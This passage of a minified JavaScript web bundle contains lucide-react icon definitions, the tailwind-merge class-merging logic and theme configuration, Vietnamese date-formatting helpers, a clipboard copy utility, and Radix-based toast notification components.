 */const ka=F("Type",[["polyline",{points:"4 7 4 4 20 4 20 7",key:"1nosan"}],["line",{x1:"9",x2:"15",y1:"20",y2:"20",key:"swin9y"}],["line",{x1:"12",x2:"12",y1:"4",y2:"20",key:"1tx1rr"}]]);/**
 * @license lucide-react v0.307.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const _e=F("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]);/**
 * @license lucide-react v0.307.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ve=F("Users",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["path",{d:"M16 3.13a4 4 0 0 1 0 7.75",key:"1da9ce"}]]);/**
 * @license lucide-react v0.307.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const rs=F("WifiOff",[["line",{x1:"2",x2:"22",y1:"2",y2:"22",key:"a6p6uj"}],["path",{d:"M8.5 16.5a5 5 0 0 1 7 0",key:"sej527"}],["path",{d:"M2 8.82a15 15 0 0 1 4.17-2.65",key:"11utq1"}],["path",{d:"M10.66 5c4.01-.36 8.14.9 11.34 3.76",key:"hxefdu"}],["path",{d:"M16.85 11.25a10 10 0 0 1 2.22 1.68",key:"q734kn"}],["path",{d:"M5 13a10 10 0 0 1 5.24-2.76",key:"piq4yl"}],["line",{x1:"12",x2:"12.01",y1:"20",y2:"20",key:"of4bc4"}]]);/**
 * @license lucide-react v0.307.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const is=F("Wifi",[["path",{d:"M5 13a10 10 0 0 1 14 0",key:"6v8j51"}],["path",{d:"M8.5 16.5a5 5 0 0 1 7 0",key:"sej527"}],["path",{d:"M2 8.82a15 15 0 0 1 20 0",key:"dnpr2z"}],["line",{x1:"12",x2:"12.01",y1:"20",y2:"20",key:"of4bc4"}]]);/**
 * @license lucide-react v0.307.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ne=F("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]);/**
 * @license lucide-react v0.307.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const hn=F("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),cs="-",_a=n=>{const t=Ca(n),{conflictingClassGroups:s,conflictingClassGroupModifiers:a}=n;return{getClassGroupId:c=>{const x=c.split(cs);return x[0]===""&&x.length!==1&&x.shift(),mn(x,t)||Sa(c)},getConflictingClassGroupIds:(c,x)=>{const l=s[c]||[];return x&&a[c]?[...l,...a[c]]:l}}},mn=(n,t)=>{var c;if(n.length===0)return t.classGroupId;const s=n[0],a=t.nextPart.get(s),r=a?mn(n.slice(1),a):void 0;if(r)return r;if(t.validators.length===0)return;const i=n.join(cs);return(c=t.validators.find(({validator:x})=>x(i)))==null?void 0:c.classGroupId},Cs=/^\[(.+)\]$/,Sa=n=>{if(Cs.test(n)){const t=Cs.exec(n)[1],s=t==null?void 0:t.substring(0,t.indexOf(":"));if(s)return"arbitrary.."+s}},Ca=n=>{const{theme:t,prefix:s}=n,a={nextPart:new Map,validators:[]};return Aa(Object.entries(n.classGroups),s).forEach(([i,c])=>{Ut(c,a,i,t)}),a},Ut=(n,t,s,a)=>{n.forEach(r=>{if(typeof r=="string"){const i=r===""?t:Ts(t,r);i.classGroupId=s;return}if(typeof r=="function"){if(Ta(r)){Ut(r(a),t,s,a);return}t.validators.push({validator:r,classGroupId:s});return}Object.entries(r).forEach(([i,c])=>{Ut(c,Ts(t,i),s,a)})})},Ts=(n,t)=>{let s=n;return t.split(cs).forEach(a=>{s.nextPart.has(a)||s.nextPart.set(a,{nextPart:new Map,validators:[]}),s=s.nextPart.get(a)}),s},Ta=n=>n.isThemeGetter,Aa=(n,t)=>t?n.map(([s,a])=>{const r=a.map(i=>typeof i=="string"?t+i:typeof i=="object"?Object.fromEntries(Object.entries(i).map(([c,x])=>[t+c,x])):i);return[s,r]}):n,Ea=n=>{if(n<1)return{get:()=>{},set:()=>{}};let t=0,s=new Map,a=new Map;const r=(i,c)=>{s.set(i,c),t++,t>n&&(t=0,a=s,s=new Map)};return{get(i){let c=s.get(i);if(c!==void 0)return c;if((c=a.get(i))!==void 0)return r(i,c),c},set(i,c){s.has(i)?s.set(i,c):r(i,c)}}},xn="!",Ra=n=>{const{separator:t,experimentalParseClassName:s}=n,a=t.length===1,r=t[0],i=t.length,c=x=>{const l=[];let y=0,f=0,b;for(let m=0;m<x.length;m++){let B=x[m];if(y===0){if(B===r&&(a||x.slice(m,m+i)===t)){l.push(x.slice(f,m)),f=m+i;continue}if(B==="/"){b=m;continue}}B==="["?y++:B==="]"&&y--}const o=l.length===0?x:x.substring(f),p=o.startsWith(xn),g=p?o.substring(1):o,h=b&&b>f?b-f:void 0;return{modifiers:l,hasImportantModifier:p,baseClassName:g,maybePostfixModifierPosition:h}};return s?x=>s({className:x,parseClassName:c}):c},Oa=n=>{if(n.length<=1)return n;const t=[];let s=[];return n.forEach(a=>{a[0]==="["?(t.push(...s.sort(),a),s=[]):s.push(a)}),t.push(...s.sort()),t},La=n=>({cache:Ea(n.cacheSize),parseClassName:Ra(n),..._a(n)}),Ma=/\s+/,Pa=(n,t)=>{const{parseClassName:s,getClassGroupId:a,getConflictingClassGroupIds:r}=t,i=[],c=n.trim().split(Ma);let x="";for(let l=c.length-1;l>=0;l-=1){const y=c[l],{modifiers:f,hasImportantModifier:b,baseClassName:o,maybePostfixModifierPosition:p}=s(y);let g=!!p,h=a(g?o.substring(0,p):o);if(!h){if(!g){x=y+(x.length>0?" "+x:x);continue}if(h=a(o),!h){x=y+(x.length>0?" "+x:x);continue}g=!1}const m=Oa(f).join(":"),B=b?m+xn:m,P=B+h;if(i.includes(P))continue;i.push(P);const S=r(h,g);for(let O=0;O<S.length;++O){const V=S[O];i.push(B+V)}x=y+(x.length>0?" "+x:x)}return x};function Da(){let n=0,t,s,a="";for(;n<arguments.length;)(t=arguments[n++])&&(s=un(t))&&(a&&(a+=" "),a+=s);return a}const un=n=>{if(typeof n=="string")return n;let t,s="";for(let a=0;a<n.length;a++)n[a]&&(t=un(n[a]))&&(s&&(s+=" "),s+=t);return s};function qa(n,...t){let s,a,r,i=c;function c(l){const y=t.reduce((f,b)=>b(f),n());return s=La(y),a=s.cache.get,r=s.cache.set,i=x,x(l)}function x(l){const y=a(l);if(y)return y;const f=Pa(l,s);return r(l,f),f}return function(){return i(Da.apply(null,arguments))}}const ae=n=>{const t=s=>s[n]||[];return t.isThemeGetter=!0,t},pn=/^\[(?:([a-z-]+):)?(.+)\]$/i,Ia=/^\d+\/\d+$/,Ba=new Set(["px","full","screen"]),Fa=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,Va=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,za=/^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,Ua=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,$a=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,Oe=n=>Qe(n)||Ba.has(n)||Ia.test(n),Be=n=>Ye(n,"length",Ya),Qe=n=>!!n&&!Number.isNaN(Number(n)),Ot=n=>Ye(n,"number",Qe),tt=n=>!!n&&Number.isInteger(Number(n)),Ha=n=>n.endsWith("%")&&Qe(n.slice(0,-1)),Y=n=>pn.test(n),Fe=n=>Fa.test(n),Ka=new Set(["length","size","percentage"]),Ga=n=>Ye(n,Ka,gn),Qa=n=>Ye(n,"position",gn),Wa=new Set(["image","url"]),Ja=n=>Ye(n,Wa,er),Xa=n=>Ye(n,"",Za),st=()=>!0,Ye=(n,t,s)=>{const a=pn.exec(n);return a?a[1]?typeof t=="string"?a[1]===t:t.has(a[1]):s(a[2]):!1},Ya=n=>Va.test(n)&&!za.test(n),gn=()=>!1,Za=n=>Ua.test(n),er=n=>$a.test(n),tr=()=>{const n=ae("colors"),t=ae("spacing"),s=ae("blur"),a=ae("brightness"),r=ae("borderColor"),i=ae("borderRadius"),c=ae("borderSpacing"),x=ae("borderWidth"),l=ae("contrast"),y=ae("grayscale"),f=ae("hueRotate"),b=ae("invert"),o=ae("gap"),p=ae("gradientColorStops"),g=ae("gradientColorStopPositions"),h=ae("inset"),m=ae("margin"),B=ae("opacity"),P=ae("padding"),S=ae("saturate"),O=ae("scale"),V=ae("sepia"),v=ae("skew"),I=ae("space"),u=ae("translate"),D=()=>["auto","contain","none"],z=()=>["auto","hidden","clip","visible","scroll"],G=()=>["auto",Y,t],j=()=>[Y,t],W=()=>["",Oe,Be],U=()=>["auto",Qe,Y],J=()=>["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"],q=()=>["solid","dashed","dotted","double","none"],T=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],E=()=>["start","end","center","between","around","evenly","stretch"],N=()=>["","0",Y],A=()=>["auto","avoid","all","avoid-page","page","left","right","column"],w=()=>[Qe,Y];return{cacheSize:500,separator:":",theme:{colors:[st],spacing:[Oe,Be],blur:["none","",Fe,Y],brightness:w(),borderColor:[n],borderRadius:["none","","full",Fe,Y],borderSpacing:j(),borderWidth:W(),contrast:w(),grayscale:N(),hueRotate:w(),invert:N(),gap:j(),gradientColorStops:[n],gradientColorStopPositions:[Ha,Be],inset:G(),margin:G(),opacity:w(),padding:j(),saturate:w(),scale:w(),sepia:N(),skew:w(),space:j(),translate:j()},classGroups:{aspect:[{aspect:["auto","square","video",Y]}],container:["container"],columns:[{columns:[Fe]}],"break-after":[{"break-after":A()}],"break-before":[{"break-before":A()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[...J(),Y]}],overflow:[{overflow:z()}],"overflow-x":[{"overflow-x":z()}],"overflow-y":[{"overflow-y":z()}],overscroll:[{overscroll:D()}],"overscroll-x":[{"overscroll-x":D()}],"overscroll-y":[{"overscroll-y":D()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[h]}],"inset-x":[{"inset-x":[h]}],"inset-y":[{"inset-y":[h]}],start:[{start:[h]}],end:[{end:[h]}],top:[{top:[h]}],right:[{right:[h]}],bottom:[{bottom:[h]}],left:[{left:[h]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",tt,Y]}],basis:[{basis:G()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",Y]}],grow:[{grow:N()}],shrink:[{shrink:N()}],order:[{order:["first","last","none",tt,Y]}],"grid-cols":[{"grid-cols":[st]}],"col-start-end":[{col:["auto",{span:["full",tt,Y]},Y]}],"col-start":[{"col-start":U()}],"col-end":[{"col-end":U()}],"grid-rows":[{"grid-rows":[st]}],"row-start-end":[{row:["auto",{span:[tt,Y]},Y]}],"row-start":[{"row-start":U()}],"row-end":[{"row-end":U()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",Y]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",Y]}],gap:[{gap:[o]}],"gap-x":[{"gap-x":[o]}],"gap-y":[{"gap-y":[o]}],"justify-content":[{justify:["normal",...E()]}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal",...E(),"baseline"]}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[...E(),"baseline"]}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[P]}],px:[{px:[P]}],py:[{py:[P]}],ps:[{ps:[P]}],pe:[{pe:[P]}],pt:[{pt:[P]}],pr:[{pr:[P]}],pb:[{pb:[P]}],pl:[{pl:[P]}],m:[{m:[m]}],mx:[{mx:[m]}],my:[{my:[m]}],ms:[{ms:[m]}],me:[{me:[m]}],mt:[{mt:[m]}],mr:[{mr:[m]}],mb:[{mb:[m]}],ml:[{ml:[m]}],"space-x":[{"space-x":[I]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[I]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit","svw","lvw","dvw",Y,t]}],"min-w":[{"min-w":[Y,t,"min","max","fit"]}],"max-w":[{"max-w":[Y,t,"none","full","min","max","fit","prose",{screen:[Fe]},Fe]}],h:[{h:[Y,t,"auto","min","max","fit","svh","lvh","dvh"]}],"min-h":[{"min-h":[Y,t,"min","max","fit","svh","lvh","dvh"]}],"max-h":[{"max-h":[Y,t,"min","max","fit","svh","lvh","dvh"]}],size:[{size:[Y,t,"auto","min","max","fit"]}],"font-size":[{text:["base",Fe,Be]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Ot]}],"font-family":[{font:[st]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractions"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",Y]}],"line-clamp":[{"line-clamp":["none",Qe,Ot]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",Oe,Y]}],"list-image":[{"list-image":["none",Y]}],"list-style-type":[{list:["none","disc","decimal",Y]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[n]}],"placeholder-opacity":[{"placeholder-opacity":[B]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[n]}],"text-opacity":[{"text-opacity":[B]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...q(),"wavy"]}],"text-decoration-thickness":[{decoration:["auto","from-font",Oe,Be]}],"underline-offset":[{"underline-offset":["auto",Oe,Y]}],"text-decoration-color":[{decoration:[n]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:j()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",Y]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",Y]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[B]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[...J(),Qa]}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",Ga]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},Ja]}],"bg-color":[{bg:[n]}],"gradient-from-pos":[{from:[g]}],"gradient-via-pos":[{via:[g]}],"gradient-to-pos":[{to:[g]}],"gradient-from":[{from:[p]}],"gradient-via":[{via:[p]}],"gradient-to":[{to:[p]}],rounded:[{rounded:[i]}],"rounded-s":[{"rounded-s":[i]}],"rounded-e":[{"rounded-e":[i]}],"rounded-t":[{"rounded-t":[i]}],"rounded-r":[{"rounded-r":[i]}],"rounded-b":[{"rounded-b":[i]}],"rounded-l":[{"rounded-l":[i]}],"rounded-ss":[{"rounded-ss":[i]}],"rounded-se":[{"rounded-se":[i]}],"rounded-ee":[{"rounded-ee":[i]}],"rounded-es":[{"rounded-es":[i]}],"rounded-tl":[{"rounded-tl":[i]}],"rounded-tr":[{"rounded-tr":[i]}],"rounded-br":[{"rounded-br":[i]}],"rounded-bl":[{"rounded-bl":[i]}],"border-w":[{border:[x]}],"border-w-x":[{"border-x":[x]}],"border-w-y":[{"border-y":[x]}],"border-w-s":[{"border-s":[x]}],"border-w-e":[{"border-e":[x]}],"border-w-t":[{"border-t":[x]}],"border-w-r":[{"border-r":[x]}],"border-w-b":[{"border-b":[x]}],"border-w-l":[{"border-l":[x]}],"border-opacity":[{"border-opacity":[B]}],"border-style":[{border:[...q(),"hidden"]}],"divide-x":[{"divide-x":[x]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[x]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[B]}],"divide-style":[{divide:q()}],"border-color":[{border:[r]}],"border-color-x":[{"border-x":[r]}],"border-color-y":[{"border-y":[r]}],"border-color-s":[{"border-s":[r]}],"border-color-e":[{"border-e":[r]}],"border-color-t":[{"border-t":[r]}],"border-color-r":[{"border-r":[r]}],"border-color-b":[{"border-b":[r]}],"border-color-l":[{"border-l":[r]}],"divide-color":[{divide:[r]}],"outline-style":[{outline:["",...q()]}],"outline-offset":[{"outline-offset":[Oe,Y]}],"outline-w":[{outline:[Oe,Be]}],"outline-color":[{outline:[n]}],"ring-w":[{ring:W()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[n]}],"ring-opacity":[{"ring-opacity":[B]}],"ring-offset-w":[{"ring-offset":[Oe,Be]}],"ring-offset-color":[{"ring-offset":[n]}],shadow:[{shadow:["","inner","none",Fe,Xa]}],"shadow-color":[{shadow:[st]}],opacity:[{opacity:[B]}],"mix-blend":[{"mix-blend":[...T(),"plus-lighter","plus-darker"]}],"bg-blend":[{"bg-blend":T()}],filter:[{filter:["","none"]}],blur:[{blur:[s]}],brightness:[{brightness:[a]}],contrast:[{contrast:[l]}],"drop-shadow":[{"drop-shadow":["","none",Fe,Y]}],grayscale:[{grayscale:[y]}],"hue-rotate":[{"hue-rotate":[f]}],invert:[{invert:[b]}],saturate:[{saturate:[S]}],sepia:[{sepia:[V]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[s]}],"backdrop-brightness":[{"backdrop-brightness":[a]}],"backdrop-contrast":[{"backdrop-contrast":[l]}],"backdrop-grayscale":[{"backdrop-grayscale":[y]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[f]}],"backdrop-invert":[{"backdrop-invert":[b]}],"backdrop-opacity":[{"backdrop-opacity":[B]}],"backdrop-saturate":[{"backdrop-saturate":[S]}],"backdrop-sepia":[{"backdrop-sepia":[V]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[c]}],"border-spacing-x":[{"border-spacing-x":[c]}],"border-spacing-y":[{"border-spacing-y":[c]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",Y]}],duration:[{duration:w()}],ease:[{ease:["linear","in","out","in-out",Y]}],delay:[{delay:w()}],animate:[{animate:["none","spin","ping","pulse","bounce",Y]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[O]}],"scale-x":[{"scale-x":[O]}],"scale-y":[{"scale-y":[O]}],rotate:[{rotate:[tt,Y]}],"translate-x":[{"translate-x":[u]}],"translate-y":[{"translate-y":[u]}],"skew-x":[{"skew-x":[v]}],"skew-y":[{"skew-y":[v]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",Y]}],accent:[{accent:["auto",n]}],appearance:[{appearance:["none","auto"]}],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",Y]}],"caret-color":[{caret:[n]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":j()}],"scroll-mx":[{"scroll-mx":j()}],"scroll-my":[{"scroll-my":j()}],"scroll-ms":[{"scroll-ms":j()}],"scroll-me":[{"scroll-me":j()}],"scroll-mt":[{"scroll-mt":j()}],"scroll-mr":[{"scroll-mr":j()}],"scroll-mb":[{"scroll-mb":j()}],"scroll-ml":[{"scroll-ml":j()}],"scroll-p":[{"scroll-p":j()}],"scroll-px":[{"scroll-px":j()}],"scroll-py":[{"scroll-py":j()}],"scroll-ps":[{"scroll-ps":j()}],"scroll-pe":[{"scroll-pe":j()}],"scroll-pt":[{"scroll-pt":j()}],"scroll-pr":[{"scroll-pr":j()}],"scroll-pb":[{"scroll-pb":j()}],"scroll-pl":[{"scroll-pl":j()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","manipulation"]}],"touch-x":[{"touch-pan":["x","left","right"]}],"touch-y":[{"touch-pan":["y","up","down"]}],"touch-pz":["touch-pinch-zoom"],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",Y]}],fill:[{fill:[n,"none"]}],"stroke-w":[{stroke:[Oe,Be,Ot]}],stroke:[{stroke:[n,"none"]}],sr:["sr-only","not-sr-only"],"forced-color-adjust":[{"forced-color-adjust":["auto","none"]}]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],size:["w","h"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],"line-clamp":["display","overflow"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-s","border-color-e","border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"],touch:["touch-x","touch-y","touch-pz"],"touch-x":["touch"],"touch-y":["touch"],"touch-pz":["touch"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}},sr=qa(tr);function Z(...n){return sr(en(n))}function ue(n,t){const s=typeof n=="string"?new Date(n):n;return new Intl.DateTimeFormat("vi-VN",{year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",...t}).format(s)}function ht(n){const t=typeof n=="string"?new Date(n):n,r=(new Date().getTime()-t.getTime())/(1e3*60*60),i=r/24;return r<1?"Vừa xong":r<24?`${Math.floor(r)} giờ trước`:i<7?`${Math.floor(i)} ngày trước`:ue(t)}function mt(n,t){let s=null;return(...a)=>{s&&clearTimeout(s),s=setTimeout(()=>n(...a),t)}}function $t(n){if(navigator.clipboard&&window.isSecureContext)return navigator.clipboard.writeText(n);{const t=document.createElement("textarea");return t.value=n,t.style.position="absolute",t.style.left="-999999px",document.body.appendChild(t),t.focus(),t.select(),new Promise((s,a)=>{document.execCommand("copy")?s():a(new Error("Copy to clipboard failed")),document.body.removeChild(t)})}}const nr=zn,fn=d.forwardRef(({className:n,...t},s)=>e.jsx(Bs,{ref:s,className:Z("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",n),...t}));fn.displayName=Bs.displayName;const ar=es("group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full",{variants:{variant:{default:"border bg-background text-foreground",destructive:"destructive group border-destructive bg-destructive text-destructive-foreground"}},defaultVariants:{variant:"default"}}),jn=d.forwardRef(({className:n,variant:t,...s},a)=>e.jsx(Fs,{ref:a,className:Z(ar({variant:t}),n),...s}));jn.displayName=Fs.displayName;const rr=d.forwardRef(({className:n,...t},s)=>e.jsx(Vs,{ref:s,className:Z("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",n),...t}));rr.displayName=Vs.displayName;const yn=d.forwardRef(({className:n,...t},s)=>e.jsx(zs,{ref:s,className:Z("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",n),"toast-close":"",...t,children:e.jsx(hn,{className:"h-4 w-4"})}));yn.displayName=zs.displayName;const vn=d.forwardRef(({className:n,...t},s)=>e.jsx(Us,{ref:s,className:Z("text-sm font-semibold",n),...t}));vn.displayName=Us.displayName;const bn=d.forwardRef(({className:n,...t},s)=>e.jsx($s,{ref:s,className:Z("text-sm opacity-90",n),...t}));bn.displayName=$s.displayName;const ir=1,cr=1e6;let Lt=0;function lr(){return Lt=(Lt+1)%Number.MAX_SAFE_INTEGER,Lt.toString()}const Mt=new Map,As=n=>{if(Mt.has(n))return;const t=setTimeout(()=>{Mt.delete(n),it({type:"REMOVE_TOAST",toastId:n})},cr);Mt.set(n,t)},or=(n,t)=>{switch(t.type){case"ADD_TOAST":return{...n,toasts:[t.toast,...n.toasts].slice(0,ir)};case"UPDATE_TOAST":return{...n,toasts:n.toasts.map(s=>s.id===t.toast.id?{...s,...t.toast}:s)};case"DISMISS_TOAST":{const{toastId:s}=t;return s?As(s):n.toasts.forEach(a=>{As(a.id)}),{...n,toasts:n.toasts.map(a=>a.id===s||s===void 0?{...a,open:!1}:a)}}case"REMOVE_TOAST":return t.toastId===void 0?{...n,toasts:[]}:{...n,toasts:n.toasts.filter(s=>s.id!==t.toastId)}}},gt=[];let ft={toasts:[]};function it(n){ft=or(ft,n),gt.forEach(t=>{t(ft)})}function je({...n}){const t=lr(),s=r=>it({type:"UPDATE_TOAST",toast:{...r,id:t}}),a=()=>it({type:"DISMISS_TOAST",toastId:t});return 